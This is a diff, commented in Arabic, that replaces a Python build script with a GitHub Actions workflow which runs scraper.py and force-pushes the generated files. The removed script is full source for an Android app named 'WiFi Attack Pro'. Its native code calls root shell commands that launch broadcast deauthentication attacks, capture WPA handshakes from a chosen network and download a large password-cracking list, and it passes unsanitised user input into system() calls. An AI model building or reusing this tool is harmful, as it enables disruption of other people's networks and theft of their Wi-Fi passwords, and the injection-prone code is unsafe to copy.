@@ -1,293 +1,158 @@
-#!/usr/bin/env python3
-import os
-import subprocess
-import shutil
-import sys
-import stat
+name: 💖 Auto Deploy - Joker Workflow
 
-PROJECT_DIR = os.path.dirname(os.path.abspath(__file__))
-APP_DIR = os.path.join(PROJECT_DIR, "app")
-SRC_DIR = os.path.join(APP_DIR, "src/main")
-JAVA_DIR = os.path.join(SRC_DIR, "java/com/attack/pro")
-RES_DIR = os.path.join(SRC_DIR, "res/layout")
-CPP_DIR = os.path.join(SRC_DIR, "cpp")
-ASSETS_DIR = os.path.join(SRC_DIR, "assets")
+on:
+  push:
+    branches: [main, master]
+  workflow_dispatch:
+    inputs:
+      deploy_message:
+        description: 'وصف النشر'
+        required: false
+        default: '💖 Auto Deploy'
 
-def ensure_dirs():
-    for d in [JAVA_DIR, RES_DIR, CPP_DIR, ASSETS_DIR]:
-        os.makedirs(d, exist_ok=True)
+permissions:
+  contents: write
 
-def write_file(path, content):
-    with open(path, "w", encoding="utf-8") as f:
-        f.write(content)
-    print(f"[+] كتبت: {path}")
+jobs:
+  generate-and-deploy:
+    runs-on: ubuntu-latest
+    
+    steps:
+      # ═══════════════════════════════════════
+      # 💖 الخطوة 1: سحب المستودع
+      # ═══════════════════════════════════════
+      - name: 📥 سحب المستودع
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+      
+      # ═══════════════════════════════════════
+      # 💖 الخطوة 2: إعداد Python
+      # ═══════════════════════════════════════
+      - name: 🐍 إعداد Python
+        uses: actions/setup-python@v5
+        with:
+          python-version: '3.12'
+      
+      # ═══════════════════════════════════════
+      # 💖 الخطوة 3: اكتشاف مجلد الإخراج
+      # ═══════════════════════════════════════
+      - name: 🔍 اكتشاف مجلد الإخراج من scraper.py
+        id: detect
+        run: |
+          # استخراج اسم المجلد من scraper.py
+          FOLDER=$(grep -oP "(?:ROOT_DIR|PROJECT_NAME)\s*=\s*['\"]?\K\w+" scraper.py | head -1)
+          if [ -z "$FOLDER" ]; then
+            # اسماء شائعة
+            for f in gtheb FileVault VIBE output build dist; do
+              if grep -q "$f" scraper.py 2>/dev/null; then
+                FOLDER="$f"
+                break
+              fi
+            done
+          fi
+          echo "folder=${FOLDER:-gtheb}" >> $GITHUB_OUTPUT
+          echo "📁 مجلد الإخراج: ${FOLDER:-gtheb}"
+      
+      # ═══════════════════════════════════════
+      # 💖 الخطوة 4: تشغيل المولد
+      # ═══════════════════════════════════════
+      - name: 🔧 تشغيل scraper.py
+        run: |
+          echo "💖 بدء توليد الملفات..."
+          python scraper.py
+          echo "✅ تم توليد الملفات"
+      
+      # ═══════════════════════════════════════
+      # 💖 الخطوة 5: نسخ الملفات
+      # ═══════════════════════════════════════
+      - name: 📁 نسخ الملفات للمجلد الرئيسي
+        run: |
+          FOLDER="${{ steps.detect.outputs.folder }}"
+          echo "📁 جاري نسخ الملفات من $FOLDER/ ..."
+          
+          if [ -d "$FOLDER" ]; then
+            cp -r $FOLDER/* . 2>/dev/null || true
+            cp -r $FOLDER/.[!.]* . 2>/dev/null || true
+            rm -rf $FOLDER
+            echo "✅ تم النسخ من $FOLDER/"
+          elif [ -d "gtheb" ]; then
+            cp -r gtheb/* . 2>/dev/null || true
+            cp -r gtheb/.[!.]* . 2>/dev/null || true
+            rm -rf gtheb
+            echo "✅ تم النسخ من gtheb/"
+          else
+            echo "⚠️ لم يتم العثور على مجلد إخراج"
+            echo "📋 الملفات الحالية:"
+            ls -la
+          fi
+      
+      # ═══════════════════════════════════════
+      # 💖 الخطوة 6: عرض الإحصائيات
+      # ═══════════════════════════════════════
+      - name: 📊 عرض إحصائيات الملفات
+        run: |
+          echo ""
+          echo "╔══════════════════════════════════════╗"
+          echo "║  💖 الملفات المنشأة  ║"
+          echo "╚══════════════════════════════════════╝"
+          echo ""
+          echo "📁 جميع الملفات:"
+          ls -la
+          echo ""
+          echo "📊 إحصائيات:"
+          echo "  • HTML: $(find . -maxdepth 1 -name '*.html' | wc -l)"
+          echo "  • CSS: $(find . -maxdepth 1 -name '*.css' | wc -l)"
+          echo "  • JS: $(find . -maxdepth 1 -name '*.js' | wc -l)"
+          echo "  • Java: $(find . -name '*.java' | wc -l)"
+          echo "  • XML: $(find . -name '*.xml' | wc -l)"
+          echo "  • Gradle: $(find . -name '*.gradle' | wc -l)"
+          echo "  • Total files: $(find . -type f | wc -l)"
+          echo "  • Total lines: $(find . -type f -exec cat {} + 2>/dev/null | wc -l)"
+          echo ""
+      
+      # ═══════════════════════════════════════
+      # 💖 الخطوة 7: رفع الملفات
+      # ═══════════════════════════════════════
+      - name: 🚀 رفع الملفات إلى GitHub
+        uses: stefanzweifel/git-auto-commit-action@v5
+        with:
+          commit_message: "💖 Auto Deploy - ${{ github.event.inputs.deploy_message || 'Generated files' }} [skip ci]"
+          commit_author: "Bot 🤖 <actions@github.com>"
+          commit_user_email: "actions@github.com"
+          commit_user_name: "GitHub Actions Bot"
+          file_pattern: '*'
+          push_options: '--force'
+      
+      # ═══════════════════════════════════════
+      # 💖 الخطوة 8: تأكيد النشر
+      # ═══════════════════════════════════════
+      - name: ✅ تأكيد النشر
+        run: |
+          echo ""
+          echo "╔════════════════════════════════════════════╗"
+          echo "║                                            ║"
+          echo "║  💖  Auto Deploy Complete                  ║"
+          echo "║  ✅  تم النشر بنجاح!                       ║"
+          echo "║                                            ║"
+          echo "║  🔗 ${{ github.server_url }}/${{ github.repository }}"
+          echo "║                                            ║"
+          echo "╚════════════════════════════════════════════╝"
+          echo ""
 
-def run_cmd(cmd, cwd=None):
-    print(f"[EXEC] {cmd}")
-    result = subprocess.run(cmd, shell=True, cwd=cwd, capture_output=True, text=True)
-    if result.returncode != 0:
-        print(f"[ERROR] {result.stderr}")
-        sys.exit(1)
-    return result.stdout
-
-def create_keystore():
-    keystore = os.path.join(PROJECT_DIR, "attack.keystore")
-    if not os.path.exists(keystore):
-        run_cmd(f"keytool -genkey -v -keystore {keystore} -alias attack -keyalg RSA -keysize 2048 -validity 10000 -storepass attackpass -keypass attackpass -dname 'CN=Attack, OU=Sec, O=Black, L=Nowhere, ST=State, C=XX'")
-    return keystore
-
-def build_apk():
-    # تشغيل Gradle
-    run_cmd("./gradlew assembleRelease", cwd=PROJECT_DIR)
-    unsigned = os.path.join(APP_DIR, "build/outputs/apk/release/app-release-unsigned.apk")
-    if not os.path.exists(unsigned):
-        print("[ERROR] فشل بناء APK")
-        sys.exit(1)
-    # توقيع
-    aligned = os.path.join(PROJECT_DIR, "app-aligned.apk")
-    signed = os.path.join(PROJECT_DIR, "WiFi_Attack_Pro.apk")
-    keystore = create_keystore()
-    run_cmd(f"zipalign -v -p 4 {unsigned} {aligned}")
-    run_cmd(f"apksigner sign --ks {keystore} --ks-pass pass:attackpass --key-pass pass:attackpass --out {signed} {aligned}")
-    os.remove(aligned)
-    print(f"[SUCCESS] APK النهائي: {signed}")
-    return signed
-
-def write_all_files():
-    # AndroidManifest.xml
-    manifest = '''<manifest xmlns:android="http://schemas.android.com/apk/res/android"
-    package="com.attack.pro">
-    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
-    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
-    <uses-permission android:name="android.permission.INTERNET"/>
-    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
-    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
-    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
-    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
-    <uses-permission android:name="android.permission.ACCESS_SUPERUSER"/>
-    <application android:allowBackup="true" android:icon="@mipmap/ic_launcher"
-        android:label="WiFi Pro Attack" android:theme="@style/Theme.AppCompat.NoActionBar">
-        <activity android:name=".MainActivity" android:exported="true">
-            <intent-filter><action android:name="android.intent.action.MAIN"/>
-                <category android:name="android.intent.category.LAUNCHER"/></intent-filter>
-        </activity>
-    </application>
-</manifest>'''
-    write_file(os.path.join(SRC_DIR, "AndroidManifest.xml"), manifest)
-
-    # MainActivity.java
-    main_activity = '''package com.attack.pro;
-import android.app.DownloadManager;
-import android.net.Uri;
-import android.os.Bundle;
-import android.os.Environment;
-import android.view.View;
-import android.widget.Button;
-import android.widget.EditText;
-import android.widget.Toast;
-import androidx.appcompat.app.AppCompatActivity;
-import java.io.File;
-
-public class MainActivity extends AppCompatActivity {
-    static { System.loadLibrary("native_inject"); }
-
-    private EditText etBSSID, etChannel, etInterface;
-    private Button btnDeauth, btnScan, btnDownload, btnHandshake;
-
-    @Override
-    protected void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_main);
-
-        etInterface = findViewById(R.id.et_interface);
-        etBSSID = findViewById(R.id.et_bssid);
-        etChannel = findViewById(R.id.et_channel);
-        btnDeauth = findViewById(R.id.btn_deauth);
-        btnScan = findViewById(R.id.btn_scan);
-        btnDownload = findViewById(R.id.btn_download);
-        btnHandshake = findViewById(R.id.btn_handshake);
-
-        btnDeauth.setOnClickListener(v -> {
-            String iface = etInterface.getText().toString();
-            String bssid = etBSSID.getText().toString();
-            if (iface.isEmpty() || bssid.isEmpty()) {
-                Toast.makeText(this, "أدخل الواجهة و BSSID", Toast.LENGTH_SHORT).show();
-                return;
-            }
-            sendDeauth(iface, bssid, "ff:ff:ff:ff:ff:ff");
-            Toast.makeText(this, "تم إرسال Deauth", Toast.LENGTH_SHORT).show();
-        });
-
-        btnScan.setOnClickListener(v -> {
-            String iface = etInterface.getText().toString();
-            if (iface.isEmpty()) {
-                Toast.makeText(this, "أدخل الواجهة", Toast.LENGTH_SHORT).show();
-                return;
-            }
-            scanNetworks(iface);
-            Toast.makeText(this, "جاري المسح...", Toast.LENGTH_SHORT).show();
-        });
-
-        btnDownload.setOnClickListener(v -> {
-            String url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt";
-            DownloadManager.Request req = new DownloadManager.Request(Uri.parse(url));
-            req.setDestinationUri(Uri.fromFile(new File(Environment.getExternalStorageDirectory(), "Download/passwords.txt")));
-            req.setTitle("تحميل قاموس كلمات المرور");
-            req.setNotificationVisibility(DownloadManager.Request.VISIBILITY_VISIBLE_NOTIFY_COMPLETED);
-            DownloadManager dm = (DownloadManager) getSystemService(DOWNLOAD_SERVICE);
-            dm.enqueue(req);
-            Toast.makeText(this, "جاري تحميل 10 مليون كلمة", Toast.LENGTH_LONG).show();
-        });
-
-        btnHandshake.setOnClickListener(v -> {
-            String iface = etInterface.getText().toString();
-            String bssid = etBSSID.getText().toString();
-            String channel = etChannel.getText().toString();
-            if (iface.isEmpty() || bssid.isEmpty() || channel.isEmpty()) {
-                Toast.makeText(this, "املأ جميع الحقول", Toast.LENGTH_SHORT).show();
-                return;
-            }
-            captureHandshake(iface, bssid, channel);
-            Toast.makeText(this, "بدء التقاط المصافحة...", Toast.LENGTH_SHORT).show();
-        });
-    }
-
-    public native void sendDeauth(String iface, String bssid, String client);
-    public native void scanNetworks(String iface);
-    public native void captureHandshake(String iface, String bssid, String channel);
-}'''
-    write_file(os.path.join(JAVA_DIR, "MainActivity.java"), main_activity)
-
-    # activity_main.xml
-    layout = '''<?xml version="1.0" encoding="utf-8"?>
-<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
-    android:layout_width="match_parent" android:layout_height="match_parent"
-    android:orientation="vertical" android:padding="16dp" android:gravity="center">
-
-    <EditText android:id="@+id/et_interface" android:layout_width="match_parent"
-        android:layout_height="wrap_content" android:hint="واجهة الشبكة (wlan0)" />
-    <EditText android:id="@+id/et_bssid" android:layout_width="match_parent"
-        android:layout_height="wrap_content" android:hint="BSSID الهدف" />
-    <EditText android:id="@+id/et_channel" android:layout_width="match_parent"
-        android:layout_height="wrap_content" android:hint="القناة (6)" />
-
-    <Button android:id="@+id/btn_scan" android:layout_width="match_parent"
-        android:layout_height="wrap_content" android:text="مسح الشبكات" />
-    <Button android:id="@+id/btn_deauth" android:layout_width="match_parent"
-        android:layout_height="wrap_content" android:text="هجوم Deauth" />
-    <Button android:id="@+id/btn_handshake" android:layout_width="match_parent"
-        android:layout_height="wrap_content" android:text="التقاط Handshake" />
-    <Button android:id="@+id/btn_download" android:layout_width="match_parent"
-        android:layout_height="wrap_content" android:text="تحميل قائمة كلمات المرور (10M)" />
-</LinearLayout>'''
-    write_file(os.path.join(RES_DIR, "activity_main.xml"), layout)
-
-    # native_inject.cpp
-    native_cpp = '''#include <jni.h>
-#include <cstdlib>
-#include <cstring>
-
-extern "C" JNIEXPORT void JNICALL
-Java_com_attack_pro_MainActivity_sendDeauth(JNIEnv* env, jobject thiz,
-                                            jstring iface, jstring bssid, jstring client) {
-    const char *i = env->GetStringUTFChars(iface, nullptr);
-    const char *b = env->GetStringUTFChars(bssid, nullptr);
-    const char *c = env->GetStringUTFChars(client, nullptr);
-    char cmd[512];
-    snprintf(cmd, sizeof(cmd), "su -c 'airmon-ng start %s; aireplay-ng -0 10 -a %s -c %s %smon'", i, b, c, i);
-    system(cmd);
-    env->ReleaseStringUTFChars(iface, i);
-    env->ReleaseStringUTFChars(bssid, b);
-    env->ReleaseStringUTFChars(client, c);
-}
-
-extern "C" JNIEXPORT void JNICALL
-Java_com_attack_pro_MainActivity_scanNetworks(JNIEnv* env, jobject thiz, jstring iface) {
-    const char *i = env->GetStringUTFChars(iface, nullptr);
-    char cmd[256];
-    snprintf(cmd, sizeof(cmd), "su -c 'airodump-ng %s --output-format csv -w /sdcard/scan'", i);
-    system(cmd);
-    env->ReleaseStringUTFChars(iface, i);
-}
-
-extern "C" JNIEXPORT void JNICALL
-Java_com_attack_pro_MainActivity_captureHandshake(JNIEnv* env, jobject thiz,
-                                                  jstring iface, jstring bssid, jstring channel) {
-    const char *i = env->GetStringUTFChars(iface, nullptr);
-    const char *b = env->GetStringUTFChars(bssid, nullptr);
-    const char *ch = env->GetStringUTFChars(channel, nullptr);
-    char cmd[512];
-    snprintf(cmd, sizeof(cmd), "su -c 'airodump-ng -c %s --bssid %s -w /sdcard/handshake %smon'", ch, b, i);
-    system(cmd);
-    env->ReleaseStringUTFChars(iface, i);
-    env->ReleaseStringUTFChars(bssid, b);
-    env->ReleaseStringUTFChars(channel, ch);
-}'''
-    write_file(os.path.join(CPP_DIR, "native_inject.cpp"), native_cpp)
-
-    # CMakeLists.txt
-    cmake = '''cmake_minimum_required(VERSION 3.18)
-project("native_inject")
-add_library(native_inject SHARED native_inject.cpp)
-target_compile_options(native_inject PRIVATE -O2 -fPIC)
-find_library(log-lib log)
-target_link_libraries(native_inject ${log-lib})'''
-    write_file(os.path.join(CPP_DIR, "CMakeLists.txt"), cmake)
-
-    # build.gradle (app)
-    app_gradle = '''plugins { id 'com.android.application' }
-android {
-    namespace 'com.attack.pro'
-    compileSdk 33
-    defaultConfig {
-        applicationId 'com.attack.pro'
-        minSdk 23
-        targetSdk 33
-        versionCode 1
-        versionName '1.0'
-        externalNativeBuild { cmake { path 'src/main/cpp/CMakeLists.txt' } }
-    }
-    buildTypes { release { minifyEnabled false } }
-    sourceSets { main { java.srcDirs = ['src/main/java'] } }
-}'''
-    write_file(os.path.join(APP_DIR, "build.gradle"), app_gradle)
-
-    # project build.gradle
-    proj_gradle = '''buildscript {
-    repositories { google(); mavenCentral() }
-    dependencies { classpath 'com.android.tools.build:gradle:8.0.0' }
-}
-task clean(type: Delete) { delete rootProject.buildDir }'''
-    write_file(os.path.join(PROJECT_DIR, "build.gradle"), proj_gradle)
-
-    # settings.gradle
-    settings = "rootProject.name = 'WiFiPro'\ninclude ':app'\n"
-    write_file(os.path.join(PROJECT_DIR, "settings.gradle"), settings)
-
-    # gradle wrapper properties
-    gradle_wrapper = os.path.join(PROJECT_DIR, "gradle/wrapper")
-    os.makedirs(gradle_wrapper, exist_ok=True)
-    write_file(os.path.join(gradle_wrapper, "gradle-wrapper.properties"),
-               "distributionUrl=https\\://services.gradle.org/distributions/gradle-8.4-bin.zip")
-    # gradlew script
-    with open(os.path.join(PROJECT_DIR, "gradlew"), "w") as f:
-        f.write("#!/bin/bash\nexec gradle \"$@\"\n")
-    os.chmod(os.path.join(PROJECT_DIR, "gradlew"), stat.S_IRWXU | stat.S_IRWXG | stat.S_IRWXO)
-
-def main():
-    print("[MAIN] بدء البناء التلقائي...")
-    ensure_dirs()
-
-    # تشغيل scraper لجلب القوائم والأدوات
-    print("[MAIN] تشغيل scraper.py...")
-    subprocess.run(["python3", "scraper.py"], cwd=PROJECT_DIR, check=True)
-
-    # كتابة جميع الملفات
-    write_all_files()
-
-    # بناء APK
-    apk_path = build_apk()
-    print(f"[MAIN] اكتمل البناء. APK موجود في: {apk_path}")
-
-if __name__ == "__main__":
-    main()
+  # ═══════════════════════════════════════════════
+  # 💖 إشعار
+  # ═══════════════════════════════════════════════
+  notify:
+    needs: generate-and-deploy
+    runs-on: ubuntu-latest
+    if: always()
+    
+    steps:
+      - name: 📊 ملخص
+        run: |
+          if [ "${{ needs.generate-and-deploy.result }}" == "success" ]; then
+            echo "🟢 النشر نجح! 💖"
+          else
+            echo "🔴 النشر فشل!"
+          fi
